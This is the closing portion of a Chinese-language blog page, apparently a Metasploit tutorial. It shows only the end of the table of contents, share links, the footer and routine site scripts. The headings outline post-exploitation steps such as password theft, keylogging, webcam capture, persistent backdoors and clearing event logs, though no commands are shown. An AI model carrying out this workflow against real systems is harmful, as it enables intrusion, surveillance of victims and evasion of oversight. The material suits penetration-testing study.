<span class="toc-text">上传 &#x2F; 下载文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.7.6.1.</span> <span class="toc-text">下载文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.7.6.2.</span> <span class="toc-text">上传文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.4.7.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.7.8.</span> <span class="toc-text">获取用户密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.4.7.9.</span> <span class="toc-text">运行程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="toc-number">1.4.7.10.</span> <span class="toc-text">屏幕截图</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.4.7.11.</span> <span class="toc-text">创建一个新账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">1.4.7.12.</span> <span class="toc-text">启用远程桌面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.4.7.13.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">1.4.7.14.</span> <span class="toc-text">进程迁移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%BD%BF%E7%94%A8%E9%94%AE%E7%9B%98%E9%BC%A0%E6%A0%87"><span class="toc-number">1.4.7.15.</span> <span class="toc-text">禁止目标主机使用键盘鼠标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%91%84%E5%83%8F%E5%A4%B4%E6%8B%8D%E7%85%A7"><span class="toc-number">1.4.7.16.</span> <span class="toc-text">用目标主机摄像头拍照</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%89%A9%E5%B1%95%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.7.17.</span> <span class="toc-text">常用扩展库介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#load-use-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.7.17.1.</span> <span class="toc-text">load&#x2F;use 命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#run-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.7.17.2.</span> <span class="toc-text">run 命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%8C%81%E7%BB%AD%E6%80%A7%E5%90%8E%E9%97%A8"><span class="toc-number">1.4.7.18.</span> <span class="toc-text">生成持续性后门</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E5%90%AF%E5%8A%A8"><span class="toc-number">1.4.7.18.1.</span> <span class="toc-text">启动项启动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8"><span class="toc-number">1.4.7.18.2.</span> <span class="toc-text">服务启动</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PortFwd-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.4.7.19.</span> <span class="toc-text">PortFwd 端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97"><span class="toc-number">1.4.7.20.</span> <span class="toc-text">清除事件日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E5%B9%B6%E6%89%A7%E8%A1%8C-PowerShell-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.8.</span> <span class="toc-text">导入并执行 PowerShell 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD-stdapi"><span class="toc-number">1.4.9.</span> <span class="toc-text">加载 stdapi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7-Session"><span class="toc-number">1.4.10.</span> <span class="toc-text">升级 Session</span></a></li></ol></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zerospace.dev/posts/2f26ee9c/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zerospace.dev/posts/2f26ee9c/&text=MSF使用教程"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zerospace.dev/posts/2f26ee9c/&is_video=false&description=MSF使用教程"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=MSF使用教程&body=Check out this article: https://zerospace.dev/posts/2f26ee9c/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zerospace.dev/posts/2f26ee9c/&title=MSF使用教程"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zerospace.dev/posts/2f26ee9c/&name=MSF使用教程&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://zerospace.dev/posts/2f26ee9c/&t=MSF使用教程"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 AsZer0s</div><div><a href="https://icp.gov.moe/?keyword=20241245" target="_blank">萌ICP备20241245号</a> | <a target="_blank" rel="noopener" href="http://gov.rip/?id=20242637" title="云ICP备:20242637号">云ICP备:20242637号</a></div><div class="footer-right"><nav><ul><li><a href="/">首页</a></li><li><a href="/tags/">标签</a></li><li><a href="/tools/">工具</a></li><li><a href="/about/">关于</a></li><li><a href="/search/">搜索</a></li><li><a href="/friends/">友链</a></li></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="复制到粘贴板!"><i class="fa-regular fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","复制成功!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "43ebe12d878c42e5a41ca4e0e2d0ae25"}'></script>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 3,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>